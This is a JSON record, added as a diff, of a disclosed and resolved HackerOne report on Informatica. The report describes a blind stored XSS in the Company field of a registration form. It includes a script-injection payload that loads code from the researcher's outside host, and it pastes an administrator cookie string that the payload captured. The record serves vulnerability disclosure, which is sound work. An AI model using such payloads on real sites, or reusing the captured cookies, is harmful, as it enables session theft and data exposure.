@@ -1,0 +1,120 @@
+{
+  "id": 1011888,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDExODg4",
+  "url": "https://hackerone.com/reports/1011888",
+  "title": "Improper Sanitization leads to XSS Fire on admin panel",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-10-19T16:07:22.107Z",
+  "submitted_at": "2020-10-19T16:07:22.235Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "montypythin",
+    "url": "/montypythin",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wej28tYjkLePEaCGbH6h8ys3/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 453,
+    "url": "https://hackerone.com/informatica",
+    "handle": "informatica",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Informatica",
+      "twitter_handle": "informatica",
+      "website": "https://www.informatica.com/",
+      "about": "Informatica Corporation is the world’s number one independent provider of data integration software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-08-03T11:32:02.985Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-08-02T21:03:41.710Z",
+  "team_member_agreed_on_going_public_at": "2021-08-03T11:32:02.871Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\nBecause the HTML is not sanitized when taking the input on https://accounts.informatica.com/registration.html,  the input is vulnerable to XSS. When a payload such as \n```\"><script src=https://monty.xss.ht></script>``` \nis put into the form under company it triggers a blind xss. When the payload successfully is loaded, it dumps information as a POC.\n\n# Steps to reproduce\n1) Goto https://accounts.informatica.com/registration.html and create a temporary account\n2) Enter a blind xss payload into the Company field\n3) Wait until an admin opens the user record\n4) Then, the report should be generated ( I used https://xsshunter.com/)\n\n#Supporting Materials\nAs mentioned, the blind XSS gave me the following IP address  who loaded the admin panel:\n████████\n\nThe URL of where the payload fired:\nhttps://█████████/phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit&TargetUser=480514&FromSearch=True#loaded\n\nThis cookie:\n```\nwm-cseu-id=%22acd409d8-0f55-4dfd-ac79-d604c5af274e%22; _ga=GA1.2.1915629716.1598908964; wm-fgug=true; wm-ueug=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-nor=true; _gid=GA1.2.244633304.1603115085; wm-ueuT=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-hb={%22sendBaseTime%22:1603115100166}; wm-wmv=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-ds-lfb=%22{}%22; wm-ssn=%22758bcf15-12bc-497e-ab66-f82c25747f45%22; wm-ssn-ct=1603118590494; wm-po-q=null; wm-prsst={%22tId%22:-1%2C%22stt%22:0%2C%22step%22:-1%2C%22spn%22:0%2C%22plgd%22:%22%22%2C%22pint%22:null%2C%22splt%22:[]%2C%22sph%22:[]%2C%22igd%22:null}; wm-ds-lbp=%22[]%22; wm-ds-b=%22[]%22; wm-ds-hb=%22[]%22; wm-ds-lbb=%22{}%22; wm-smtp-init={%22type%22:6}; wm-ds-s=%22[]%22; shoppingcart_coupons=%5B%5D; multiVPoll=; c-s=expires=1603207989~access=/clientimg/informatica/*!/content/informatica/*~md5=832a84c8a012e7d42c375195181dde62; amplitude_id_a328ec1895b18ee52643ef53449b6ecbcsod.com=eyJkZXZpY2VJZCI6IjgwYTA3ZDIxLTA3ZDctNDc4Mi1iNzIxLTc2NTkzMDJkYzg3OFIiLCJ1c2VySWQiOiJENDA4OTY2NUE4OTc5REMyQjUyNDhGMkM1NTk2Q0E1MjdEMzVGQUJFMzA2MTc5REQ0NjA5NEUyQUU1QUJCQUMxIiwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNjAzMTIxMTg3NTM0LCJsYXN0RXZlbnRUaW1lIjoxNjAzMTIxNTkyODA3LCJldmVudElkIjoyMjIsImlkZW50aWZ5SWQiOjIxOSwic2VxdWVuY2VOdW1iZXIiOjQ0MX0=; wm-po-p=13; wm-po-r=13; wm-dmn=csod.com; _gat=1; wm-ds-lb=%22{}%22\n```\n\nWhat the XSS saw:\n█████\nNote that this is leaking what appears to be another customer's data\n\nThe full report:\n████████\n\n## Impact\n\nWith this blind XSS vulnerability, a malicious actor could download malware, install a keylogger, steal the admin cookie, and learn IPs of the backend servers and softwares. Also as shown by the screenshot it leaks singular user's names and their corresponding email addresses.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-09-01T21:03:41.781Z",
+  "allow_singular_disclosure_after": -147809433.856196,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "osman1337",
+    "alp",
+    "shreyaschavhan",
+    "run_win",
+    "akashhamal0x01",
+    "2026",
+    "g0ktug",
+    "citril",
+    "0x0days",
+    "ba53ll",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
